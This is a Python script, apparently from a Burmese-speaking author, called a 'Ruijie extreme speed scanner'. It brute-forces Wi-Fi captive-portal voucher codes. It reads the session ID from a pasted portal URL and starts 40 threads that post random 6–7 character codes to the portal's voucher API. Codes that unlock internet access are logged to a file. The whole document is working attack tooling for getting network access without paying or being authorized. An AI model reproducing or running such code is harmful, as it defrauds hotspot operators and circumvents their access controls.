import requests
import threading
import random
import os
import time
import string
from colorama import Fore, Style, init

init(autoreset=True)
C_CYAN = Fore.CYAN + Style.BRIGHT
C_GREEN = Fore.GREEN + Style.BRIGHT
C_RED = Fore.RED + Style.BRIGHT
C_YELLOW = Fore.YELLOW + Style.BRIGHT
C_WHITE = Fore.WHITE + Style.BRIGHT
C_RESET = Style.RESET_ALL

# --- [ GLOBAL STATS ] ---
total_tried = 0
found_hits = 0
found_list = []
start_time = time.time()
stop_event = threading.Event()

def banner(sid, api_url, threads):
    os.system('clear')
    elapsed = time.time() - start_time
    speed = total_tried / elapsed if elapsed > 0 else 0
    
    print(f"{C_YELLOW}⚡ RUIJIE EXTREME SPEED SCANNER ⚡")
    print(f"{C_WHITE}="*45)
    print(f"{C_CYAN}[BASE URL] : {C_WHITE}{api_url}")
    print(f"{C_CYAN}[THREADS]  : {C_WHITE}{threads} active")
    print(f"{C_CYAN}[SESSION]  : {C_WHITE}{sid[:15]}...")
    print(f"{C_WHITE}="*45)
    print(f"{C_CYAN}[TOTAL TRIED] : {C_WHITE}{total_tried:,}")
    print(f"{C_CYAN}[FOUND HITS]  : {C_GREEN}{found_hits}")
    print(f"{C_CYAN}[LIVE SPEED]  : {C_YELLOW}{speed:.2f} codes/sec")
    print(f"{C_WHITE}="*45)
    print(f"{C_YELLOW}[SUCCESS CODES]:")
    for code in found_list[-5:]: # နောက်ဆုံးရတဲ့ ၅ ခုပဲပြမယ်
        print(f" {C_GREEN}> ✅ {code}")
    print(f"{C_WHITE}="*45)
    print(f"{C_WHITE}(CTRL+C TO STOP)")

def check_internet():
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3, allow_redirects=False)
        return r.status_code == 204
    except: return False

def scan_logic(sid, api_url):
    global total_tried, found_hits
    # အစ်ကိုအလိုရှိတဲ့ စာလုံးအသေး (a-z) နှင့် ဂဏန်း (0-9)
    chars = string.ascii_lowercase + string.digits
    
    while not stop_event.is_set():
        # ၆ လုံး မှ ၇ လုံးအထိ Random ထုတ်ခြင်း
        length = random.randint(6, 7)
        code = "".join(random.choice(chars) for _ in range(length))
        
        payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}
        
        try:
            total_tried += 1
            res = requests.post(api_url, json=payload, timeout=5)
            
            if "success" in res.text.lower() or res.status_code == 200:
                # အင်တာနက် တကယ်ထွက်မထွက် စစ်ဆေးခြင်း
                if check_internet():
                    found_hits += 1
                    found_list.append(code)
                    with open("found_vouchers.txt", "a") as f:
                        f.write(f"CODE: {code} | TIME: {time.ctime()}\n")
            
        except:
            time.sleep(1)

def main():
    os.system('clear')
    print(f"{C_CYAN}[?] Paste Portal URL:{C_RESET}")
    portal_url = input(f"{C_GREEN}root@scanner:~# {C_RESET}").strip()
    
    import re
    from urllib.parse import urlparse
    sid_match = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', portal_url)
    
    if sid_match:
        sid = sid_match.group(1)
        parsed = urlparse(portal_url)
        api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
        
        # Thread အရေအတွက် (၈၀ လောက်အထိ တိုးချင်ရင် ဒီမှာပြင်ပါ)
        threads_count = 40 
        
        for i in range(threads_count):
            t = threading.Thread(target=scan_logic, args=(sid, api_url), daemon=True)
            t.start()
            
        try:
            while True:
                banner(sid, api_url, threads_count)
                time.sleep(1) # ၁ စက္ကန့်တစ်ခါ Stats update လုပ်မယ်
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{C_RED}[!] Stopped. Check found_vouchers.txt for results.")
    else:
        print(f"{C_RED}[X] Session ID not found in URL.")

if __name__ == "__main__":
    main()
